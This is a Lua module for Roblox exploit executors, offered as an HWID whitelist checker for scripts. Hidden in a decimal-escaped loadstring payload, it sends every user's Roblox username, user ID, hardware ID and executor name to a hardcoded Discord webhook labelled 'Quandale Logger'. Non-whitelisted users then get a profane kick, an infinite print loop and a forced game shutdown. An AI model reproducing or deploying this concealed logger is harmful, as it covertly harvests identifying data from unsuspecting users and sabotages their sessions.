local GAL = {
    ["Req"] = http_request or request or HttpPost or syn.request
}

function GAL:Execute(Arg)
	if Arg["Do"] == "CheckWhitelist" then
		local http_request = http_request;
		local http_request = http_request;
		local WebhookCheck = if getexecutorname and type(getexecutorname) == "function" then getexecutorname() else is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
		--game.HttpGet(game, "http://api.ipify.org")
		local hwid = ""
		local Headers = game.HttpService:JSONDecode(GAL["Req"]({
		["Method"] = "GET",
		["Url"] = "http://mockbin.com/request"
		})["Body"])["headers"]
		local EidList = {
		"comet-fingerprint",
		"delta-fingerprint",
		"electron-fingerprint",
		"evon-fingerprint",
		"flux-fingerprint",
		"krnl-hwid",
		"oxy-fingerprint",
		"sw-user-identifier",
		"syn-user-identifier",
		"trigon-fingerprint",
		"wrd-fingerprint"
		}
		for I, S in pairs(EidList) do
			if Headers[S] then
			hwid = Headers[S]
    end
end
GAL["Req"](loadstring("\123\85\114\108\32\61\32\34\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\97\112\112\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\48\52\56\50\50\55\51\56\55\51\49\57\53\49\55\49\57\52\47\45\112\88\73\65\117\48\71\110\86\104\77\85\89\99\50\113\51\68\56\116\95\120\79\56\110\48\111\108\104\121\97\76\76\98\104\80\116\95\56\97\107\110\71\67\67\99\53\81\121\80\105\112\107\54\82\111\68\54\119\86\117\108\95\84\98\113\51\34\44\32\66\111\100\121\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\72\116\116\112\83\101\114\118\105\99\101\34\41\58\74\83\79\78\69\110\99\111\100\101\40\123\91\34\99\111\110\116\101\110\116\34\93\32\61\32\34\76\111\111\107\115\32\108\105\107\101\32\34\46\46\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\78\97\109\101\46\46\34\32\34\46\46\34\106\117\115\116\32\101\120\101\99\117\116\101\100\32\121\111\117\114\32\115\99\114\105\112\116\46\34\44\91\34\117\115\101\114\110\97\109\101\34\93\32\61\32\34\81\117\97\110\100\97\108\101\32\76\111\103\103\101\114\34\44\91\34\97\118\97\116\97\114\95\117\114\108\34\93\32\61\32\34\104\116\116\112\115\58\47\47\105\48\46\119\112\46\99\111\109\47\119\119\119\46\102\111\108\108\111\119\99\104\97\105\110\46\111\114\103\47\119\112\45\99\111\110\116\101\110\116\47\117\112\108\111\97\100\115\47\50\48\50\50\47\48\55\47\113\117\97\110\100\97\108\101\45\100\105\110\103\108\101\45\114\101\97\108\45\112\101\114\115\111\110\45\50\46\106\112\103\63\114\101\115\105\122\101\61\53\49\50\37\50\67\53\49\50\38\115\115\108\61\49\34\44\91\34\101\109\98\101\100\115\34\93\32\61\32\123\123\91\34\116\105\116\108\101\34\93\32\61\32\34\95\95\42\42\83\99\114\105\112\116\32\69\120\101\99\117\116\101\100\42\42\95\95\34\44\91\34\100\101\115\99\114\105\112\116\105\111\110\34\93\32\61\32\34\42\42\73\110\102\111\58\42\42\34\44\91\34\116\121\112\101\34\93\32\61\32\34\114\105\99\104\34\44\91\34\99\111\108\111\114\34\93\32\61\32\116\111\110\117\109\98\101\114\40\48\120\102\102\102\102\102\102\41\44\91\34\102\105\101\108\100\115\34\93\32\61\32\123\123\91\34\110\97\109\101\34\93\32\61\32\34\95\95\85\115\101\114\110\97\109\101\58\95\95\34\44\91\34\118\97\108\117\101\34\93\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\78\97\109\101\44\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\44\123\91\34\110\97\109\101\34\93\32\61\32\34\95\95\73\68\58\95\95\34\44\91\34\118\97\108\117\101\34\93\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\85\115\101\114\73\100\44\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\44\123\91\34\110\97\109\101\34\93\32\61\32\34\95\95\72\87\73\68\58\95\95\34\44\91\34\118\97\108\117\101\34\93\32\61\32\104\119\105\100\44\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\44\123\91\34\110\97\109\101\34\93\32\61\32\34\95\95\69\120\101\99\117\116\111\114\58\95\95\34\44\91\34\118\97\108\117\101\34\93\32\61\32\87\101\98\104\111\111\107\67\104\101\99\107\44\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\44\123\91\34\110\97\109\101\34\93\32\61\32\34\73\80\58\102\108\117\115\104\101\100\58\34\44\91\34\118\97\108\117\101\34\93\32\61\32\34\65\121\111\34\44\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\125\125\125\125\41\44\32\77\101\116\104\111\100\32\61\32\34\80\79\83\84\34\44\32\72\101\97\100\101\114\115\32\61\32\123\91\34\99\111\110\116\101\110\116\45\116\121\112\101\34\93\32\61\32\34\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110\34\125\125\10")())
        	local function R()
            	for I, S in pairs(Arg["L"] or {}) do
                		if S == hwid then
                    return true
                end
            end
            return false
        end
        	if not R() then
            	if Arg["Func"] and type(Arg["Func"]) == "function" then
                		Arg["Func"]()
            end
            task.spawn(function()
                repeat
                    print("Dumbass ong frfr:skull:")
                until false
            end)
            game.Players.LocalPlayer:Kick("Fuck you dumbass:joy:")
            game:Shutdown()
        end
	end
end
return GAL

--[[
GoofyAss({
  ["Do"] = "R",
  ["Func"] = function() -- Runs Your Function Before Crash And Has A Goofy Gui Too --
    print("Hello World.")
  end,
  ["L"] = {
  ["ScriptaMan#8144"] = "DDE25C0952F91D6BAB7D79A464831E0477304D3477557511A0B91C092A8D183D",
  ["Doflamingo#0654"] = "D8903A045B944640FCB8FA1CA4A094B088BC"
  }
})
--]]
